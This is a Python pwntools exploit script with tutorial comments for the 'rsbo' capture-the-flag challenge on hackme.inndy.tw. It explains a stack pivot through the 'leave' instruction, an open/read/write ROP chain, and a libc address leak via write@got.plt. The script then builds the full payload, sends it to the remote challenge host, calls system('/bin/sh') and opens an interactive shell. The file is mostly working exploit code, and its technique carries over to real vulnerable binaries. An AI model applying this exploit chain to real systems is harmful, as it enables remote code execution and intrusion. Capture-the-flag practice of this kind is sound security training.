from pwn import *
from struct import *

#
#   Essential Tech Knowledge for This Challenge:
#       1. ROP
#           Reference:
#               https://www.slideshare.net/hackstuff/rop-40525248
#       2. file-descriptor
#           Reference:
#               https://en.wikipedia.org/wiki/File_descriptor
#               https://www.bottomupcs.com/file_descriptors.xhtml
#               http://wanggen.myweb.hinet.net/ech2/ech2.html
#
#   The asm instruction 'leave' will do:
#       mov esp, ebp
#       pop ebp
#   
#   Using this feature, we can overwrite to specific address and rewrite ebp.
#
#   I rewrite the stack address to 0x0804a600.
#
#   Now, you can write your ROP chain to here.
#
#   First, we use the read(int fd, void *buf, size_t count) function,
#   Writing 0x0804a600 to address 0x0804a600.
#
#   In the beginning of any c function, it always do:
#       push ebp
#       mov ebp, esp
#   And in the end, it always do:
#       leave
#   Or in other words:
#       mov esp, ebp
#       pop ebp
#       
#   If we rewrite 0x87 to the address pointed by ebp,
#   when leave is executed, it will make esp point to 0x87, which pointed by ebp.
#   And then pop to ebp, BANG, we successfully rewrite ebp.
#
#   Using the tech of rewriting ebp, we can rewriting the ebp to 0x0804a600.
#
#   And now, let's talk about open/read/write.
#   The stack arrangement for these functions is like:
#       High Memory Address
#       esp => return address
#              parameter 1
#              parameter 2
#              ......
#
#   At read_80_bytes function, we can send a payload such like this:
#       padding
#       fake ebp address         (0x0804a600)
#       fake ret address of main (anywhere you want)
#
#   ebp will become 0x0804a600, and the control flow will go to the fake ret address.
#   
#   How about this? :
#       1st payload for 1st read in read_80_bytes
#           padding
#           fake ebp address            (0x0804a600)
#           fake ret address of main    (read@plt)
#           fake ret address of read    (leave)
#           parameter 1                 (0, which is the fd of stdin, see 'man 2 read')
#           parameter 2                 (0x0804a600, see 'man 2 read')
#           parameter 3                 (0x90, just input a large number, see 'man 2 read')
#       2nd payload for 2nd read which provided by hacker
#           data-at-0x0804a600          (0x0804a600)
#
#   The control flow will do read(0, 0x0804a600, 0x90),
#   then return to fake ret address of read.
#
#   Bang!! We can write 0x0804a600 to 0x0804a600~~
#
#   If we make fake ret address of read return to the end of main function:
#          0x08048733 :   leave  
#          0x08048734 :   ret
#
#   leave will do:
#       mov esp, ebp
#       pop ebp
#   
#   And before this, we already make ebp pointed to 0x0804a600.
#   BANG!! We also rewrite the esp~~.
#   Because the value at 0x0804a600 also is 0x0804a600,
#   after pop, ebp is still 0x0804a600, and esp will add 4, 0x0804a604
#
#   Furthermore, I find a useful ROP gadget by this command:
#       ROPgadget --binary rsbo |grep esp
#   The gadget is:
#       0x080483ca : add esp, 8 ; pop ebx ; ret
#   Because 'pop' also add 4 to esp, the gadget actually do
#        add esp, 12
#   If we put this gadget to our payload:
#       1st payload for 1st read in read_80_bytes
#           padding
#           fake ebp address            (0x0804a600)
#           fake ret address of main    (read@plt)
#           fake ret address of read    (leave)
#           parameter 1                 (0, which is the fd of stdin, see 'man 2 read')
#           parameter 2                 (0x0804a600, see 'man 2 read')
#           parameter 3                 (0x90, just input a large number, see 'man 2 read')
#       2nd payload for 2nd read which provided by hacker
#           data-at-0x0804a600          (0x0804a600)
#           data-at-0x0804a604          (0x080483ca, add_esp_12 gadget)
#           data-at-0x0804a608          (padding)
#           data-at-0x0804a60c          (padding)
#           data-at-0x0804a610          (padding)
#           Chain-open
#           Chain-read
#           Chain-write
#
#   Bang, get the flag~~~
#
#   Exploit2 is more malicious than Exploit1
#
#   IT WILL GET THE SHELL
#
#   To leak the libc address, the following write-up:
#       http://bruce30262.logdown.com/posts/301623-csaw-ctf-2015-autobots
#   give a tip.
#
#   We can make a ROP chain to do:
#       write(stdout, write@got.plt, len)
#   
#   The address of 'write@got.plt' is stable, 
#   and the value at the address is the address of 'write'
#
#   0x0804a028                      valueX
#   --------------------------      -----------
#   | (write@got.plt) valueX |----->| (write) |
#   --------------------------      -----------
#
#   And then, just call system("/bin/sh") using ROP chain!!!
#
#   About finding out offset of libc function, plz see 'hackme.inndy.tw/raas/exploit.py'
#   You can try following command, hope it will help you:
#       readelf -s libc-2.23.so.i386|grep -E ' (write|system)@@'
#
#

open_fd = 0x3

#r = process('./rsbo')
#r = remote('localhost', 5566)
r = remote('hackme.inndy.tw', 7706)

# The offset table of inndy's host
SYSTEM_OFFSET   = 0x3ad80
WRITE_OFFSET    = 0xd5c70
# The offset table of my localhost
#SYSTEM_OFFSET   = 0x3a940
#WRITE_OFFSET    = 0xd43c0


padding = '\x00' * 0x68
BUF_LEN         = 0x90
BUF             = pack('<L', 0x0804a500)
FAKE_STACK      = pack('<L', 0x0804a600)
FAKE_STACK_60   = pack('<L', 0x0804a600 + 0x4 * 0xf)
FAKE_STACK_72   = pack('<L', 0x0804a600 + 0x4 * 0xf + 0x4 * 0x3)
LEAVE           = pack('<L', 0x08048733)

WRITE_GOT       = pack('<L', 0x0804a028)

OPEN_PLT        = pack('<L', 0x08048420)
OPEN_PATHNAME   = pack('<L', 0x080487d0)
OPEN_FLAGS      = pack('<L', 0x0)
READ_PLT        = pack('<L', 0x080483e0)
READ_FD         = pack('<L', open_fd)
READ_FD_STDIN   = pack('<L', 0x0)
READ_BUF        = BUF
READ_COUNT      = pack('<L', BUF_LEN)
WRITE_PLT       = pack('<L', 0x08048450)
WRITE_FD        = pack('<L', 0x1)
WRITE_BUF       = BUF
WRITE_COUNT     = pack('<L', BUF_LEN)
ADD_ESP_12      = pack('<L', 0x080483ca)

payload = padding
payload += FAKE_STACK # fake ebp address
payload += READ_PLT # fake ret address of main
payload += LEAVE # fake ret address of read
payload += READ_FD_STDIN + FAKE_STACK + READ_COUNT # parameter of read
payload += FAKE_STACK # data at fake ebp address
payload += ADD_ESP_12 
payload += '\x00' * 12 # padding
payload += WRITE_PLT + ADD_ESP_12 + WRITE_FD + WRITE_GOT + WRITE_COUNT
payload += READ_PLT + ADD_ESP_12 + READ_FD_STDIN + FAKE_STACK_60 + READ_COUNT

r.sendline(payload)

WRITE_ADDR      = unpack("I", r.recvn(4))[0]
SYSTEM_ADDR     = pack('<L', WRITE_ADDR - WRITE_OFFSET + SYSTEM_OFFSET)

payload = SYSTEM_ADDR + '\x00' * 4 + FAKE_STACK_72 + '/bin/sh'
r.sendline(payload)

r.interactive()
